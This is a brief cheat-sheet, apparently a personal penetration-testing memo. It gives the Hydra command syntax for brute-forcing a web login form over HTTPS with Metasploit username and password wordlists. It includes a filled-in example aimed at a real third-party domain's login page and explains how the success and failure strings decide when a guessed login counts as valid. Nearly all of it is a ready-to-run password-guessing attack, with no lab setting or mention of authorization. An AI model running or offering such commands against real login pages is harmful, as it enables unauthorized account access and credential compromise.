hydra -L /usr/share/wordlists/metasploit/namelist.txt -P /usr/share/wordlists/metasploit/password.lst -o hydra_result [URI] -V https-form-post "[URL]:[Payload]:F=[string]"
ex:
hydra -L /usr/share/wordlists/metasploit/namelist.txt -P /usr/share/wordlists/metasploit/password.lst -o hydra_result www.google.com -V https-form-post "/login.php:username=^USER^&password=^PASS^:F=fail"

S = success condition, if hydra grep payload and find [string], hydra will take it as a success login
F = fail condition, if hydra grep payload and find [string], hydra will know it is fail and keep trying next one. If hydra does not find the [string], hydra will take it as a success login.
